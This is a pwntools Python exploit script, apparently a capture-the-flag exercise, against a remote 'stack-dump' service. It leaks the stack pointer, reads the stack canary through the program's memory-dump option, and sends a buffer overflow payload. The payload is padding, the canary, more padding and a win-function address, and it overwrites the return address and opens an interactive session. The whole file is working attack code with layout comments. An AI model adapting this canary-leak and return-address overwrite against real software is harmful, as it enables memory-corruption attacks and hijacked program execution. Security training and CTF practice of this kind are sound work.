from pwn import *
import re


# p = process("./stack-dump")
p = remote("plsdonthaq.me", 2004)

p.recvline() # Lets try a real stack canary, like the ones GCC uses

ptrLine = p.recvline()
sp = int(re.findall(b"0x(.+?)\n", ptrLine)[0],16)
bp = sp + 0x71

print(ptrLine, p32(sp))

p.recv()

# Loop

def inputData(length, data):
    # print("Do input")
    if type(length) is int:
        length = str(length) 
    p.sendline("a")
    p.recv()
    p.sendline(length) # gets used, can modify other memory addresses
    p.sendline(data) # Write into variable, limited by atoi(length)
    p.recv()
    p.recv(timeout=1)
    ### Could set length to a very large number, then write arbitrary data with data
    ### Could also just write arbitrary data with length

def dumpMemory():
    # print("Do dump")
    p.sendline("b")
    p.recvuntil(': ')
    data = p.recvline(keepends=False) 
    # print("Line: ", data)
    p.recv()
    p.recv(timeout=1)
    return data

def quit():
    p.sendline("d")
    p.interactive()
    try:
        print("Quit:", p.recv())
    except:
        print("Quit:", "No data on quit")
        pass

# buffer at ebp-0x68
# canary at ebp-0x8
# return address somewhere around ebp

# Need to overwrite the return address
# Leak the canary through inputData -> dumpMemory
# # The stack pointer is ebp-0x71, so ebp is esp+0x71
# # The canary is located at ebp-0x08

# Then use inputData to write PAD + CANARY + PAD +  WIN (0x80486c6)
# The first pad is the buffer
# The second pad is 8 bytes for the pushed ebx and ebp

inputData(4, p32(bp-0x08)) # Set location to dump to the canary location
canary = dumpMemory()[:4]  # Extract the canary
inputData(0x68 + 8, b"A"*0x60 + canary + b'A'*8 + b'\xc6\x86\x04\x08')
                    # PAD                # PAD    # Win Function    
quit()

